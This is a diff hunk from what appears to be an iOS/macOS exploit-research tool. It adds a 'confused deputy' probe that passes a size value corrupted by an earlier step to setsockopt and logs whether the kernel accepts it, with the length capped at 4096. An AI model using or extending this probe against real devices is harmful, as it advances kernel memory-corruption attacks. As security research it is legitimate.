@@ -1380,6 +1380,36 @@ cleanup:
                         scopeNote(r, [NSString stringWithFormat:
                             @"    size: 0x%08x -> 0x%08x (delta=%+d)", szBefore, szAfter,
                             (int)szAfter - (int)szBefore]);
+
+                        // ---- CONFUSED DEPUTY: use corrupted size with setsockopt ----
+                        // setsockopt(IPPROTO_TCP, TCP_NODELAY, &val, corrupted_size)
+                        // kernel copies min(corrupted_size, sizeof(val)) bytes from &val.
+                        // If corrupted_size > sizeof(val), kernel reads OOB from userland.
+                        scopeNote(r, @"  --- confused deputy: setsockopt with corrupted size ---");
+                        int sock = socket(AF_INET, SOCK_STREAM, 0);
+                        if (sock >= 0) {
+                            int val = 0x41414141;
+                            uint32_t evilLen = szAfter;  // corrupted size
+                            socklen_t sl = (socklen_t)evilLen;
+                            // Cap to avoid crash — just show the concept
+                            if (sl > 4096) sl = 4096;
+                            int ret = setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &val, sl);
+                            scopeNote(r, [NSString stringWithFormat:
+                                @"  setsockopt(fd=%d, TCP_NODELAY, len=%u) ret=%d errno=%d",
+                                sock, (unsigned)sl, ret, errno]);
+                            if (ret == 0) {
+                                scopeNote(r, @"  >>> CONFUSED DEPUTY: kernel accepted corrupted size!");
+                            } else {
+                                scopeNote(r, [NSString stringWithFormat:
+                                    @"  kernel rejected size (errno=%d) — trying smaller", errno]);
+                                // Try with the actual value size
+                                sl = sizeof(val);
+                                ret = setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &val, sl);
+                                scopeNote(r, [NSString stringWithFormat:
+                                    @"  retry setsockopt(len=%zu) ret=%d", sl, ret]);
+                            }
+                            close(sock);
+                        }
                     }
                 }
                 if (len > 0xFFFF) {
